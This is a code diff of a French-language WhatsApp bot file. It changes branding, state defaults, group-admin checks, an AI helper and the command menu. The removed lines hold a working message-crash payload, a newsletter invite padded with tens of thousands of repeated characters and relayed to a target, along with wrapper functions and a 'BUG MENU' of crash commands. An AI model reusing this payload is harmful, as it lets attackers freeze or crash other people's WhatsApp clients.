@@ -1,18 +1,27 @@
-/*
-Dev : Natsu Tech a votre service 242053323191.
-chacun connaît comment évolue les choses les choses de son côté, comme le disait Kalash criminel dans sauvagerie 4 ( grim and the flow ) Natsu toujours vif 242053323191
-*/
+
 
 import axios from 'axios';
 import fs from 'node:fs';
 import path from 'node:path';
+import { execFile } from 'node:child_process';
+import { promisify } from 'node:util';
 import { fileURLToPath } from 'node:url';
-import { generateWAMessageFromContent, proto } from '@whiskeysockets/baileys';
 
-const sleep = (ms) => new Promise(r => setTimeout(r, ms));
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
+const execFileAsync = promisify(execFile);
 const DATA_DIR = path.join(__dirname, 'data');
 if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
+
+const VIDEO_DIR = path.join(__dirname, 'video');
+if (!fs.existsSync(VIDEO_DIR)) fs.mkdirSync(VIDEO_DIR, { recursive: true });
+
+// ═════════════════════════════════════════════════════════════════════════
+// 🎬 VIDÉO DU MENU — C'EST ICI QUE ÇA SE PASSE, C'EST TOUT SIMPLE
+// ═════════════════════════════════════════════════════════════════════════
+// On utilise EXACTEMENT la même vidéo que celle envoyée par le /start
+// Telegram (dossier "video", fichier messi.mp4), pour que .menu sur
+// WhatsApp affiche la même vidéo que /start sur Telegram.
+const MENU_LOCAL_VIDEO = path.join(VIDEO_DIR, 'code.mp4');
 
 // ─────────────────────────────────────────────────────────────────────────────
 // CORE CONFIG
@@ -20,31 +29,31 @@ if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
 export const PREFIX   = '.';
 // Tous les préfixes acceptés pour appeler le bot
 export const PREFIXES = ['.', '/', '!', '#', ',', '+'];
-export const BOT_NAME = '𝙺𝚈𝙰𝚁𝙰 𝚇𝙱𝙾𝚃';
-export const DEV_NAME = 'KILLUA OFFICIEL';
+export const BOT_NAME = '𝐊𝐈𝐋𝐋𝐔𝐀 𝗠𝗗';
+export const DEV_NAME = '𝐊𝐈𝐋𝐋𝐔𝐀';
 
-export const MENU_IMAGE   = 'https://i.ibb.co/bMw2Y4mK/RD32353437393339373733343240732e77686174736170702e6e6574-884547.png';
-export const MENU_IMAGE_2 = 'https://i.ibb.co/mrKPq2NX/RD32353437393339373733343240732e77686174736170702e6e6574-520919.jpg';
+export const MENU_IMAGE   = 'https://files.catbox.moe/srbmwy.jpg';
+export const MENU_IMAGE_2 = 'https://files.catbox.moe/f7hyrr.jpg';
 export const MENU_IMAGES  = [MENU_IMAGE, MENU_IMAGE_2];
 export const NEWSLETTER_JID  = '120363406589060879@newsletter'; //<== No change 
-export const NEWSLETTER_NAME = '𝐊𝐈𝐋𝐋𝐔𝐀 𝐓𝐄𝐂𝐇';
+export const NEWSLETTER_NAME = '𝐊𝐈𝐋𝐋𝐔𝐀 𝐓𝐄𝐀𝐌';
 
 // ─── OWNER INFO (édite ces valeurs avec tes vraies infos) ───────────────────
-export const OWNER_NUMBER  = '243906905464';            // sans +, sans espaces
-export const OWNER_NAME    = 'Killua';
-export const OWNER_WA      = 'https://wa.me/243906905464';
-export const OWNER_TG      = 'https://t.me/cabrinox';
-export const OWNER_GITHUB  = 'https://github.com/cabrin21';
-export const REPO_URL      = 'https://github.com/cabrin21/killua_xbot';
-export const BOT_VERSION   = 'V1.2';
+export const OWNER_NUMBER  = process.env.OWNER_NUMBER || ''; // sans +, sans espaces
+export const OWNER_NAME    = '𝐊𝐈𝐋𝐋𝐔𝐀';
+export const OWNER_WA      = '*https://wa.me/243906905464*';
+export const OWNER_TG      = '*https://t.mecabrinox*';
+export const OWNER_GITHUB  = '*https://github.com/cabrin21*';
+export const REPO_URL      = '*https://github.com/cabrin21/bolth*';
+export const BOT_VERSION   = 'V1.0';
 
 export const WA_CHANNELS = [
   'https://whatsapp.com/channel/0029VbCHB1eDjiOUGG4OCS2t',
-  'https://whatsapp.com/channel/0029Vb6E9Kb84Om7UbQX431m',
+  
 ];
+
 export const WA_GROUPS = [
-  'https://chat.whatsapp.com/FJmSNCa6q7oBkFV3hloAtQ',
-  'https://chat.whatsapp.com/CY4GCf2RAhk1EpwLchhmad',
+  '*https://chat.whatsapp.com/Ht2NmJr9DoC0RyrnKvS5w*',
 ];
 
 // Forwarded-from-channel context (makes messages look forwarded from newsletter)
@@ -59,7 +68,7 @@ export function forwardedContext() {
     },
     externalAdReply: {
       title: BOT_NAME,
-      body: `Dev: ${DEV_NAME}`,
+      body: `𝗗𝗘𝗩 𝗕𝗬 : ${DEV_NAME}`,
       thumbnailUrl: MENU_IMAGE,
       sourceUrl: WA_CHANNELS[0],
       mediaType: 1,
@@ -81,114 +90,29 @@ function getState() {
   s.sudo       ??= [];
   s.banned     ??= [];
   s.blocked    ??= [];
-  s.antilink   ??= {};   // groupJid -> true/false
-  s.antistatut  ??= {};   // groupJid -> true/false (blocks status mentions in groups)
-  s.mode       ??= 'public'; // public | private
+  s.antilink   ??= true;   // groupJid -> true/false
+  // Public by default. Older releases saved 'self', which silently ignored commands.
+  // Migrate that old default once so existing deployments become usable.
+  if (!s._modeMigrationV2) {
+    s.mode = 'public';
+    s._modeMigrationV2 = true;
+  }
+  s.mode       ??= 'public'; // public | self
   s.autoread   ??= false;
   s.autobio    ??= false;
   s.autorecord ??= false;
-  s.autotyping ??= false;
-  s.autoviewsts ??= false;
+  s.autotyping ??= true;
+  s.autoviewsts ??= true;
   s.autoreact  ??= false;
+  s.welcome    ??= {};   // groupJid -> true/false
+  s.goodbye    ??= {};   // groupJid -> true/false
   s.account    ??= '';
   s.warns      ??= {};   // jidGroup -> { userJid: count }
   s.afks       ??= {};   // userJid  -> { reason, since }
   s.prefix     ??= '.';
-  s.welcome    ??= {};   // groupJid -> { enabled, text }
-  s.goodbye    ??= {};   // groupJid -> { enabled, text }
   return s;
 }
 function updateState(fn) { const s = getState(); fn(s); saveState(s); return s; }
-
-
-// ─────────────────────────────────────────────────────────────────────────────
-// GROUP GREETING CONFIG
-// ─────────────────────────────────────────────────────────────────────────────
-const DEFAULT_WELCOME = `╭━━━〔 ✨ 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 〕━━━╮
-┃
-┃ 👤 𝐍𝐨𝐮𝐯𝐞𝐚𝐮 𝐦𝐞𝐦𝐛𝐫𝐞 : {user}
-┃ 🏠 𝐆𝐫𝐨𝐮𝐩𝐞 : {group}
-┃ 👥 𝐌𝐞𝐦𝐛𝐫𝐞𝐬 : {members}
-┃
-┃ 🎉 Bienvenue dans la communauté !
-┃ 🤝 Nous sommes heureux de t'accueillir.
-┃
-┃ 📜 Tape *{prefix}menu* pour découvrir
-┃ toutes les fonctionnalités de {bot}.
-┃
-╰━━━━━━━━━━━━━━━━━━━━━━╯
-
-> 🤖 {bot}
-> 👨‍💻 Dev : {dev}`;
-
-const DEFAULT_GOODBYE = `╭━━━〔 👋 𝐆𝐎𝐎𝐃𝐁𝐘𝐄 〕━━━╮
-┃
-┃ 👤 {user}
-┃ 🏠 {group}
-┃
-┃ 😢 Un membre vient de nous quitter.
-┃ 💙 Merci pour ton passage parmi nous.
-┃ 👋 Bonne continuation !
-┃
-╰━━━━━━━━━━━━━━━━━━━━━━╯
-
-> 🤖 {bot}
-> 👨‍💻 Dev : {dev}`;
-
-function getGroupGreetingConfig(state, jid, type) {
-  const key = type === 'goodbye' ? 'goodbye' : 'welcome';
-  state[key] ??= {};
-
-  const existing = state[key][jid];
-  if (!existing || typeof existing !== 'object') {
-    state[key][jid] = {
-      enabled: true,
-      text: key === 'welcome' ? DEFAULT_WELCOME : DEFAULT_GOODBYE,
-    };
-  } else {
-    if (typeof existing.enabled !== 'boolean') existing.enabled = true;
-    if (typeof existing.text !== 'string' || !existing.text.trim()) {
-      existing.text = key === 'welcome' ? DEFAULT_WELCOME : DEFAULT_GOODBYE;
-    }
-  }
-
-  return state[key][jid];
-}
-
-function renderGroupGreeting(text, vars = {}) {
-  const values = {
-    user: vars.user ?? '',
-    group: vars.group ?? 'Notre groupe',
-    members: vars.members ?? 0,
-    count: vars.count ?? vars.members ?? 0,
-    bot: vars.bot ?? BOT_NAME,
-    dev: vars.dev ?? DEV_NAME,
-    prefix: vars.prefix ?? PREFIX,
-  };
-
-  return String(text || DEFAULT_WELCOME).replace(
-    /\{(user|group|members|count|bot|dev|prefix)\}/gi,
-    (_, key) => values[key.toLowerCase()] ?? `{${key}}`
-  );
-}
-
-function greetingHelp(prefix = PREFIX) {
-  return `╭━━━〔 👋 𝐆𝐑𝐄𝐄𝐓𝐈𝐍𝐆𝐒 〕━━━╮
-┃
-┃ ${prefix}welcome on/off/status
-┃ ${prefix}setwelcome <message>
-┃ ${prefix}resetwelcome
-┃
-┃ ${prefix}goodbye on/off/status
-┃ ${prefix}setgoodbye <message>
-┃ ${prefix}resetgoodbye
-┃
-┃ Variables disponibles :
-┃ {user} {group} {members} {bot}
-┃ {dev} {prefix}
-┃
-╰━━━━━━━━━━━━━━━━━━━━━━╯`;
-}
 
 // ─────────────────────────────────────────────────────────────────────────────
 // HELPERS
@@ -220,84 +144,156 @@ export function getMessageText(msg) {
 
 function isGroup(jid) { return jid?.endsWith('@g.us'); }
 
-// Detect WhatsApp status mentions, including current/future nested wrappers.
-// Baileys exposes statusMentionMessage / groupStatusMentionMessage for these.
-function containsStatusMention(message) {
-  const seen = new WeakSet();
-
-  const walk = (value, depth = 0) => {
-    if (!value || depth > 7 || typeof value !== 'object') return false;
-    if (seen.has(value)) return false;
-    seen.add(value);
-
-    if (Array.isArray(value)) {
-      return value.some(item => walk(item, depth + 1));
-    }
-
-    for (const [key, child] of Object.entries(value)) {
-      if (
-        key === 'statusMentionMessage' ||
-        key === 'groupStatusMentionMessage' ||
-        key === 'statusMentionMessageInfo'
-      ) {
-        return Boolean(child);
-      }
-
-      if (child && typeof child === 'object' && walk(child, depth + 1)) {
-        return true;
-      }
-    }
-
-    return false;
-  };
-
-  return walk(message);
-}
-
 // In-memory cache for group metadata (60s TTL) — huge speed win
 const _groupMetaCache = new Map(); // jid -> { meta, exp }
-const GROUP_META_TTL = 60 * 1000;
+const GROUP_META_TTL = 5 * 1000; // permissions can change quickly; don't keep stale admin data
 
-async function getGroupAdmins(natsu, jid) {
+function bareJid(value = '') {
+  return String(value || '').trim().toLowerCase().replace(/:.*?(?=@)/, '');
+}
+
+function jidNumber(value = '') {
+  const s = bareJid(value);
+  return normalizeNumber(s.split('@')[0]);
+}
+
+function sameParticipant(a, b) {
+  if (!a || !b) return false;
+  const aa = bareJid(a), bb = bareJid(b);
+  if (aa && aa === bb) return true;
+  const an = jidNumber(aa), bn = jidNumber(bb);
+  return !!an && !!bn && an === bn;
+}
+
+function botIdentityCandidates(natsu) {
+  const me = natsu?.authState?.creds?.me || natsu?.creds?.me || {};
+  return [
+    natsu?.user?.id,
+    natsu?.user?.lid,
+    natsu?.user?.jid,
+    natsu?.user?.phoneNumber,
+    me?.id,
+    me?.lid,
+    me?.jid,
+    me?.phoneNumber,
+  ].filter(Boolean);
+}
+
+function botMatchesParticipant(p, natsu) {
+  if (!p) return false;
+  const ids = botIdentityCandidates(natsu);
+  const pIds = [p.id, p.lid, p.phoneNumber].filter(Boolean);
+  return ids.some(a => pIds.some(b => sameParticipant(a, b)));
+}
+
+async function getGroupAdmins(natsu, jid, forceFresh = false) {
   try {
     const now = Date.now();
     const cached = _groupMetaCache.get(jid);
-    let meta;
-    if (cached && cached.exp > now) {
-      meta = cached.meta;
-    } else {
-      meta = await natsu.groupMetadata(jid);
-      _groupMetaCache.set(jid, { meta, exp: now + GROUP_META_TTL });
-    }
-    const admins = meta.participants.filter(p => p.admin).map(p => p.id);
-    const rawId = natsu.user?.id || '';
-    const lidId = natsu.user?.lid || '';
-    const botPhone = rawId.split(':')[0].split('@')[0];
-    const botJid = botPhone ? `${botPhone}@s.whatsapp.net` : '';
-    const botLid = lidId ? lidId.split(':')[0].split('@')[0] + '@lid' : '';
-    const botIsAdmin =
-      admins.includes(botJid) ||
-      (botLid && admins.includes(botLid)) ||
-      meta.participants.some(p => p.admin && (p.id === botJid || p.id === botLid));
-    return { meta, admins, botIsAdmin, botJid };
-  } catch { return { meta: null, admins: [], botIsAdmin: false, botJid: '' }; }
+    const meta = !forceFresh && cached && cached.exp > now
+      ? cached.meta
+      : await natsu.groupMetadata(jid);
+    _groupMetaCache.set(jid, { meta, exp: now + GROUP_META_TTL });
+
+    const participants = meta?.participants || [];
+    const isAdminParticipant = p => p?.admin === 'admin' || p?.admin === 'superadmin' || !!p?.admin;
+    const admins = participants.filter(isAdminParticipant).map(p => p.id).filter(Boolean);
+
+    // WhatsApp Multi-Device may expose the bot as a phone JID, LID,
+    // device-qualified JID, or through creds.me. Compare every available
+    // identity so a real admin is not reported as "bot must be admin".
+    const botIds = new Set(botIdentityCandidates(natsu));
+    const botParticipant = participants.find(p => botMatchesParticipant(p, natsu));
+    const botIsAdmin = !!botParticipant && isAdminParticipant(botParticipant);
+    const botJid = botParticipant?.id || [...botIds][0] || '';
+
+    return { meta, admins, botIsAdmin, botJid, botIds, botParticipant };
+  } catch {
+    return { meta: null, admins: [], botIsAdmin: false, botJid: '', botIds: new Set(), botParticipant: null };
+  }
 }
 
 // Invalidate cache when a group changes
 export function invalidateGroupCache(jid) { _groupMetaCache.delete(jid); }
 
 // Check if a given JID is a group admin (handles both regular & LID format)
-function isGroupAdmin(adminsList, userJid) {
+function isGroupAdmin(adminsList, userJid, meta = null) {
   if (!userJid) return false;
-  const phone = userJid.split('@')[0].split(':')[0];
-  return adminsList.some(a => {
-    const aPhone = a.split('@')[0].split(':')[0];
-    return a === userJid || aPhone === phone;
+  if (adminsList.includes(userJid)) return true;
+  const phone = normalizeNumber(userJid.split('@')[0].split(':')[0]);
+  if (!phone) return false;
+  return (meta?.participants || []).some(p => {
+    if (!p.admin) return false;
+    if (p.id === userJid || p.lid === userJid) return true;
+    const pPhone = normalizeNumber(p.phoneNumber || p.id?.split('@')[0]?.split(':')[0] || '');
+    return pPhone && pPhone === phone;
   });
 }
 
 function sender(msg) {
   return msg.key.participant || msg.key.remoteJid;
+}
+
+function senderNumber(msg) {
+  const candidates = [
+    msg.key?.participantAlt,
+    msg.key?.senderPn,
+    msg.key?.participant,
+    msg.key?.remoteJidAlt,
+    msg.key?.remoteJid,
+  ].filter(Boolean);
+  for (const value of candidates) {
+    const n = normalizeNumber(String(value).split('@')[0].split(':')[0]);
+    // WhatsApp LIDs are often long numeric IDs; participantAlt/senderPn is preferred.
+    if (n) return n;
+  }
+  return '';
+}
+
+function normalizeNumber(value = '') {
+  return String(value).replace(/\D/g, '').replace(/^0+/, '');
+}
+
+function isOwnerOrSudo(msg, state, senderNum) {
+  if (msg.key?.fromMe) return true;
+  const owner = normalizeNumber(OWNER_NUMBER);
+  const sender = normalizeNumber(senderNum);
+  return !!sender && ((owner && sender === owner) || state.sudo.includes(sender));
+}
+
+async function requireGroupAdmin(natsu, jid, msg, senderJid, reply) {
+  if (!isGroup(jid)) { await reply('*❌ ɢʀᴏᴜᴘ ᴏɴʟʏ.*'); return null; }
+
+  let info = await getGroupAdmins(natsu, jid);
+  if (!info.meta) { await reply('*❌ ɪᴍᴘᴏssɪʙʟᴇ ᴅᴇ ʟɪʀᴇ ʟᴇ ɢʀᴏᴜᴘᴇ.*'); return null; }
+
+  // If the cached metadata says the bot is not admin, refresh once before
+  // rejecting. This fixes the common case where WhatsApp promoted the bot
+  // moments ago or returned a stale LID/phone representation.
+  if (!info.botIsAdmin) {
+    info = await getGroupAdmins(natsu, jid, true);
+  }
+  if (!info.botIsAdmin) {
+    await reply('*❌ ʟᴇ ʙᴏᴛ ᴅᴏɪᴛ ᴇ̂ᴛʀᴇ ᴀᴅᴍɪɴ.*');
+    return null;
+  }
+
+  // Check the sender's actual group role after resolving phone/LID.
+  // Bot's own messages are allowed only because they are generated by the bot.
+  if (!msg.key?.fromMe && !isGroupAdmin(info.admins, senderJid, info.meta)) {
+    await reply('*❌ ᴀᴅᴍɪɴs ᴏɴʟʏ.*');
+    return null;
+  }
+  return info;
+}
+
+// Group-member gate: harmless group utilities are available to every member.
+// Moderation/settings commands must use requireGroupAdmin/requireGroupOwnerOrCreator.
+async function requireGroupMember(natsu, jid, reply) {
+  if (!isGroup(jid)) { await reply('*❌ ɢʀᴏᴜᴘ ᴏɴʟʏ.*'); return null; }
+  const info = await getGroupAdmins(natsu, jid);
+  if (!info.meta) { await reply('*❌ ɪᴍᴘᴏssɪʙʟᴇ ᴅᴇ ʟɪʀᴇ ʟᴇ ɢʀᴏᴜᴘᴇ.*'); return null; }
+  return info;
 }
 
 function quotedMsg(msg) {
@@ -327,11 +323,9 @@ async function askAI(prompt, model = 'gpt') {
     story: 'openai', trivia: 'openai',
   };
   const m = map[model] || 'openai';
-  const urls = [
-    `https://text.pollinations.ai/${q}?model=${m}`,
-    `https://text.pollinations.ai/${q}`,
-    `https://api.dreaded.site/api/chatgpt?text=${q}`,
-  ];
+  const urls = [];
+  const pollenKey = process.env.POLLINATIONS_API_KEY || '';
+  if (pollenKey) urls.push(`https://gen.pollinations.ai/text/${q}?model=${m}&key=${encodeURIComponent(pollenKey)}`);
   const parse = (d) => {
     if (typeof d === 'string' && d.trim().startsWith('{')) {
       try { d = JSON.parse(d); } catch {}
@@ -341,15 +335,12 @@ async function askAI(prompt, model = 'gpt') {
       : (d?.BK9 || d?.result || d?.response || d?.data?.response || d?.data?.message ||
          d?.message || d?.answer || d?.gpt4 || d?.result?.prompt || null);
   };
-  const call = (u) => axios.get(u, { timeout: 6000, responseType: 'text', transformResponse: [(d) => d] })
+  const call = (u) => axios.get(u, { timeout: 15000, responseType: 'text', transformResponse: [(d) => d], headers: pollenKey ? { Authorization: `Bearer ${pollenKey}` } : {} })
     .then(r => parse(r.data)).then(a => a && String(a).trim() ? String(a).trim() : Promise.reject('empty'));
-  try {
-    return await Promise.any(urls.slice(0, 2).map(call));
-  } catch {}
-  for (const u of urls.slice(2)) {
-    try { const a = await call(u); if (a) return a; } catch {}
-  }
-  return `🤖 [${model.toUpperCase()}] est occupé. Réessaie dans un instant.`;
+  if (urls.length) { try { const a = await call(urls[0]); if (a) return a; } catch {} }
+  return pollenKey
+    ? `🐐 *${model.toUpperCase()}* indisponible pour le moment. Réessaie dans quelques secondes.`
+    : `⚠️ *${model.toUpperCase()}* nécessite POLLINATIONS_API_KEY dans .env.`;
 }
 
 // Image search / fetch helper — timeout reduced from 12s to 7s
@@ -361,7 +352,10 @@ async function fetchAnyImage(urls) {
       const url =
         d?.url || d?.image || d?.message ||
         d?.result?.url || d?.result?.[0]?.url ||
-        (Array.isArray(d?.images) && d.images[0]) ||
+        d?.results?.[0]?.url ||
+        d?.data?.[0]?.url ||
+        d?.data?.[0]?.images?.jpg?.image_url ||
+        (Array.isArray(d?.images) && (typeof d.images[0] === 'string' ? d.images[0] : d.images[0]?.url)) ||
         (typeof d === 'string' && d.startsWith('http') ? d : null);
       if (url) return url;
     } catch {}
@@ -379,39 +373,6 @@ async function getImageBuffer(url) {
     _imgCache.set(url, buf);
     return buf;
   } catch { return null; }
-}
-
-// ─────────────────────────────────────────────────────────────────────────────
-// it's here you add your funct bug 👇
-// ─────────────────────────────────────────────────────────────────────────────
-async function VsxBlankNewlaster(natsu, target) {
-  const message = generateWAMessageFromContent(target, proto.Message.fromObject({
-    newsletterAdminInviteMessage: {
-      newsletterJid: "120363406589060879@newsletter",
-      newsletterName: "ꦾ" + "ꦽ".repeat(30000),
-      jpegThumbnail: Buffer.alloc(10),
-      caption: "ꦾ" + "ꦽ".repeat(30000),
-      inviteExpiration: Math.floor(Date.now() / 1000) + (7 * 24 * 60 * 60),
-      inviteMessage: "Hi bro it's me from killua"
-    },
-    contextInfo: {
-      mentionedJid: ["0@s.whatsapp.net"],
-      forwardingScore: 1,
-      isForwarded: true,
-      businessMessageForwardInfo: {
-        businessOwnerJid: "243906905464@s.whatsapp.net"
-      },
-      externalAdReply: {
-        title: "ꦽ".repeat(30000),
-        body: "ꦾ".repeat(30000),
-        thumbnail: Buffer.alloc(10),
-        mediaType: 1,
-        renderLargerThumbnail: false,
-        showAdAttribution: true,
-      }
-    }
-  }), { userJid: natsu.user.id });
-  await natsu.relayMessage(target, message.message, { messageId: message.key.id });
 }
 
 // Send image with forwarded context (uses cached buffer when possible)
@@ -443,66 +404,105 @@ const HANGMAN_WORDS = ['javascript','whatsapp','queen','baileys','telegram','afr
 // MENU BUILDER
 // ─────────────────────────────────────────────────────────────────────────────
 const MENU_GROUPS = {
-    '╭━━〔GROUP MENU〕━━▢': ['tagall','hidetag','tagadmins','promote','demote','kick','add','mute','unmute','left','grouplink','resetlink','kickadmins','kickall','listadmins','listonline','opentime','closetime','antilink','vcf','creategroup','join','closegc','opengc','welcome','setwelcome','resetwelcome','goodbye','setgoodbye','resetgoodbye','antilink','antistatut','warn','warns','resetwarn'],
-    '╭━━〔OWNER MENU〕━━▢': ['owner','repo','setpp','setprefix','restart','eval','ban','unban','self','public','autoread','autobio','autorecording','autotyping','autoviewstatus','autoreact','block','unblock','delete','setaccount','addsudo','delsudo','listsudo','fixowner','getbot','broadcast','mode','ping','alive','runtime'],
-    '╭━━〔FUN MENU〕━━▢': ['truth','dare','joke','meme','ship','rate','flirt','roast','compliment','wouldyou','8balladvice','urban','moviequote','triviafact','inspire','ascii','progquote','dadjoke','funfact','paptt'],
-    '╭━━〔GAME MENU〕━━▢': ['rps','rpsls','dice','coin','coinbattle','numberbattle','numbattle','hangman','tictactoe','guess','math','emojiquiz','gamefact','toimg','take','steal','wm','qc'],
-    '╭━━〔SOUND MENU〕━━▢': ['bass','blown','deep','earrape','fast','nightcore','reverse','robot','slow','smooth','squirrel','tts','say'],
-    '╭━━〔MAIL MENU〕━━▢': ['newmail','readmail','deltmp','tempmail2','tempmail-inbox'],
-    '╭━━〔OTHER MENU〕━━▢': ['weatherwiki','currency','time','qrcode','readqr','shorturl','myip','iplookup','jid','getpp','github','npm','ffstalk','npmstalk','imbd','dictionary','recipe','book','remind','calculate','mathfact','sciencefact','recipe-ingredient','horoscope','password','genpass','readmore','lidch','react-ch','translate','lyrics','afk','removebg','upscale','savestatus'],
-    '╭━━〔IMAGE MENU〕━━▢': ['sfw','moe','aipic','hentai','chinagirl','bluearchive','boypic','carimage','random-girl','hijab-girl','indonesia-girl','japan-girl','korean-girl','loli','malaysia-girl','profile-pictures','tiktokgirl'],
-    '╭━━〔AI MENU〕━━▢': ['ai','gpt','gpt4','gpt5','metaai','codeai','photoai','storyai','triviaai','deepseek','grok-ai','qwen','gemini'],
-    '╭━━〔ANIME MENU〕━━▢': ['achar','aquote','arecommend','asearch','loli','maid','megumin','neko','shinobu','waifu'],
-    '╭━━〔STICKER MENU〕━━▢': ['telegraph','url','sticker'],
-    '╭━━〔DOWNLO MENU〕━━▢': ['apk','edit','fb','git','gitclone','insta','mega','mp4','pint','play','song','video','yta','ytmp3','ytv','tiktok','spotify'],
-    '╭━━〔BUG MENU〕━━▢': ['fcxui','bugcampuran','killuacrash','crashspam','delayinvis','manzxeveryone','protocolbug5'],
-    '╭━━〔CONNECT MENU〕━━▢': ['pair','connect'],
+  '🏠 ᴘʀɪɴᴄɪᴘᴀʟ': {
+    emoji: '🏠',
+    cmds: ['menu','help','list','ping','alive','runtime','prefix','test','botstatus','owner','repo']
+  },
+  '🧠 ᴀɪ & ᴄʜᴀᴛ': {
+    emoji: '🧠',
+    cmds: ['ai','gpt','gpt4','gpt5','gemini','deepseek','qwen','grok-ai','metaai','codeai','photoai','storyai','triviaai']
+  },
+  '👥 ɢʀᴏᴜᴘᴇ — ᴍᴇᴍʙʀᴇs': {
+    emoji: '👥',
+    cmds: ['groupinfo','groupid','groupname','members','membercount','admins','myrole','memberinfo','groupadmins','listadmins','tagall','hidetag','tagadmins','rules','poll','vcf','listonline']
+  },
+  '🛡️ ɢʀᴏᴜᴘᴇ — ᴀᴅᴍɪɴ': {
+    emoji: '🛡️',
+    cmds: ['welcome','goodbye','promote','demote','add','kick','mute','unmute','grouplink','resetlink','closegc','opengc','lock','unlock','antilink','warn','warns','resetwarn','kickadmins','kickall','setrules','opentime','closetime','left']
+  },
+  '👑 ᴏᴡɴᴇʀ & sʏsᴛᴇᴍ': {
+    emoji: '👑',
+    cmds: ['self','public','mode','setprefix','setpp','restart','eval','ban','unban','block','unblock','delete','addsudo','delsudo','listsudo','fixowner','getbot','broadcast','autoread','autobio','autorecording','autotyping','autoviewstatus','autoreact']
+  },
+  '📥 ᴛᴇ́ʟᴇ́ᴄʜᴀʀɢᴇᴍᴇɴᴛ': {
+    emoji: '📥',
+    cmds: ['play','song','yt','yta','ytmp3','ytv','tiktok','instagram','insta','facebook','fb','spotify','video','mp4','apk','git','gitclone','mega','pint','edit']
+  },
+  '🛠️ ᴏᴜᴛɪʟs & ᴜᴛɪʟɪᴛᴀɪʀᴇs': {
+    emoji: '🛠️',
+    cmds: ['weatherwiki','currency','time','mediastatus','qrcode','readqr','shorturl','myip','iplookup','jid','getpp','github','npm','dictionary','recipe','book','remind','calculate','mathfact','sciencefact','translate','lyrics','afk','removebg','upscale','savestatus','react-ch','apistatus']
+  },
+  '🕵️ ᴛʀᴀᴄᴋ & ɪɴғᴏ': {
+    emoji: '🕵️',
+    cmds: ['ffstalk','npmstalk','github','lidch','listonline','vcf']
+  },
+  '🎨 ᴍᴇ́ᴅɪᴀ & ᴄᴏɴᴠᴇʀᴛɪssᴇᴜʀ': {
+    emoji: '🎨',
+    cmds: ['sticker','stiker','telegraph','url','toimg','take','steal','wm','qc','tts','say']
+  },
+  '🎧 ᴇғғᴇᴛs ᴀᴜᴅɪᴏ': {
+    emoji: '🎧',
+    cmds: ['bass','blown','deep','earrape','fast','nightcore','reverse','robot','slow','smooth','squirrel']
+  },
+  '🎮 ᴊᴇᴜx': {
+    emoji: '🎮',
+    cmds: ['rps','rpsls','dice','coin','coinbattle','numberbattle','numbattle','hangman','tictactoe','guess','math','emojiquiz','gamefact']
+  },
+  '😂 ғᴜɴ & ᴅɪᴠᴇʀᴛɪssᴇᴍᴇɴᴛ': {
+    emoji: '😂',
+    cmds: ['truth','dare','joke','meme','ship','rate','flirt','roast','compliment','wouldyou','8balladvice','urban','moviequote','triviafact','inspire','ascii','progquote','dadjoke','funfact','paptt']
+  },
+  '💮 ᴀɴɪᴍᴇ': {
+    emoji: '💮',
+    cmds: ['achar','aquote','arecommend','asearch','maid','megumin','neko','shinobu','waifu']
+  },
+  '🖼️ ɪᴍᴀɢᴇs': {
+    emoji: '🖼️',
+    cmds: ['sfw','moe','aipic','chinagirl','bluearchive','boypic','carimage','random-girl','hijab-girl','indonesia-girl','japan-girl','korean-girl','malaysia-girl','profile-pictures','tiktokgirl']
+  },
+  '🔗 ᴄᴏɴɴᴇxɪᴏɴ': {
+    emoji: '🔗',
+    cmds: ['pair','connect','bot']
+  },
+  '📧 ᴛᴇᴍᴘᴍᴀɪʟ': {
+    emoji: '📧',
+    cmds: ['newmail','tempmail','readmail','inbox','deltmp','delmail','tempmail2','tempmail-inbox']
+  },
+  '💰 ᴄᴏᴍᴘᴛᴇ & ᴘᴀɪᴇᴍᴇɴᴛ': {
+    emoji: '💰',
+    cmds: ['aza','account','setaccount']
+  }
 };
 
 // Set de toutes les commandes connues — sert au déclenchement sans préfixe
 export const KNOWN_CMDS = (() => {
-  const s = new Set(['menu','help','list','ping','alive','runtime','uptime','del','prefix','private','public','self','mode','antistatut','antistatus']);
-  for (const arr of Object.values(MENU_GROUPS)) for (const c of arr) s.add(c.toLowerCase());
+  const s = new Set(['menu','help','list','ping','alive','runtime','uptime','del','prefix','test']);
+  for (const group of Object.values(MENU_GROUPS)) for (const c of group.cmds) s.add(c.toLowerCase());
   return s;
 })();
-// ─── Fonctions de crash supplémentaires (à adapter selon tes payloads) ───
-async function ForcloseNew(natsu, target) {
-    // Par défaut, on utilise VsxBlankNewlaster
-    await VsxBlankNewlaster(natsu, target);
-}
-async function DelayInvis1(natsu, target) {
-    await VsxBlankNewlaster(natsu, target);
-}
-async function Delayinvis2(natsu, target) {
-    await VsxBlankNewlaster(natsu, target);
-}
-async function protocolbug5(natsu, target) {
-    await VsxBlankNewlaster(natsu, target);
-}
-function buildMenu(userName = '') {
-  const groups = MENU_GROUPS;
 
+function buildMenu(userName = '') {
+  const activePrefix = getState().prefix || PREFIX;
   let body = '';
-  for (const [title, cmds] of Object.entries(groups)) {
-    body += `\n*${title}*\n`;
-    body += cmds.map((c) => `┃ ◈ ${PREFIX}${c}`).join('\n');
-    body += '\n';
+
+  // Menu en une seule colonne, comme dans ta capture.
+  for (const [title, group] of Object.entries(MENU_GROUPS)) {
+    const cleanTitle = title.replace(/^[^ ]+\s+/, '').toUpperCase();
+    body += `\n╭━━〔 ${group.emoji} *${cleanTitle}* 〕━━╮\n`;
+    for (const command of group.cmds) body += `│ ◈ ${activePrefix}${command}\n`;
+    body += `╰━━━━━━━━━━━━━━━━━━━━╯\n`;
   }
 
-  return `───────🍁───────
-    *${BOT_NAME}*
- User: ${userName || 'You'}
- Prefixes: *${PREFIXES.join(' ')}*
- Owner: *${DEV_NAME}*
- Version: *4.0.1*
-──────🌹────────
+  return `╭━━━〔 *${BOT_NAME}* 〕━━━╮
+│ 👤 User : ${userName || 'You'}
+│ 👑 Dev  : ${DEV_NAME}
+│ ⚡ Prefix : ${activePrefix}
+╰━━━━━━━━━━━━━━━━━━━━╯
 
- *༼KILLUA × KYARA༽* 
-«──────🌹─────»
- 
 ${body}
-━━━━━━━━━━━━━━━━━
-> ${BOT_NAME} • ${DEV_NAME}`;
+╭━━━〔 *KILLUA MD* 〕━━━╮
+│ 👑 Powered by ${DEV_NAME}
